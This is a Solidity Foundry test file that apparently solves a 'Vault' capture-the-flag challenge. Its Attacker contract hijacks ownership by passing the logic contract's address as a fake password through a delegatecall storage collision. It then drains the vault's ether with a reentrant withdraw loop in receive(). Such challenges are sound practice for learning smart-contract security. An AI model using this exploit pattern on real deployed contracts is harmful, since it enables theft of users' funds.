// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

contract Attacker {
    Vault public vault;
    bool private attacking;

    constructor(Vault _vault) {
        vault = _vault;
    }

    function exploit(VaultLogic logic) external payable {
        bytes32 fakePassword = bytes32(uint256(uint160(address(logic))));
        (bool ok,) = address(vault).call(
            abi.encodeWithSignature("changeOwner(bytes32,address)", fakePassword, address(this))
        );
        require(ok, "changeOwner failed");

        vault.openWithdraw();
        vault.deposite{value: msg.value}();

        attacking = true;
        vault.withdraw();
        attacking = false;
    }

    receive() external payable {
        if (attacking && address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}

contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 0.1 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 1 ether);
        vm.startPrank(palyer);

        Attacker attacker = new Attacker(vault);
        attacker.exploit{value: 0.1 ether}(logic);

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
